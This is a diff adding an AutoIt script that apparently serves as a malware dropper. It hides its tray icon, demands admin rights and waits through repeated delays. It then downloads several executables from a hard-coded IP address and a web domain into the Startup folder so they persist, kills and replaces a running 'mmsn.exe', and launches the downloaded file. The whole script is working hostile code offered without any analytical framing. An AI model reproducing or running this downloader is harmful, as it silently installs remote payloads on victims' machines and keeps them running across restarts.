@@ -1,0 +1,27 @@
+﻿#NoTrayIcon
+#RequireAdmin
+ BREAK ( 0 )
+ $A = "http://173.201.233.47/yahoo.exe"
+ $B = @STARTUPDIR
+ $C = "\ .exe"
+ SLEEP ( 60000 )
+ INETGET ( $A , $B & $C )
+ IF PROCESSEXISTS ( "mmsn.exe" ) THEN
+ SLEEP ( 20000 )
+ PROCESSCLOSE ( "mmsn.exe" )
+ ENDIF
+ $D = "http://173.201.233.47/mmsn.exe"
+ $E = @STARTUPDIR
+ $F = "\mmsn.exe"
+ SLEEP ( 60000 )
+ INETGET ( $D , $E & $F )
+ $G = "http://www.kidsearch.info/lost.exe"
+ $H = @STARTUPDIR
+ $K = "\mmsn.exe"
+ SLEEP ( 60000 )
+ INETGET ( $G , $H & $K )
+ IF FILEEXISTS ( @STARTUPDIR & "\mmsn.exe" ) THEN
+ SLEEP ( 60000 )
+ RUN ( @STARTUPDIR & "\mmsn.exe" )
+ ENDIF
+ EXIT
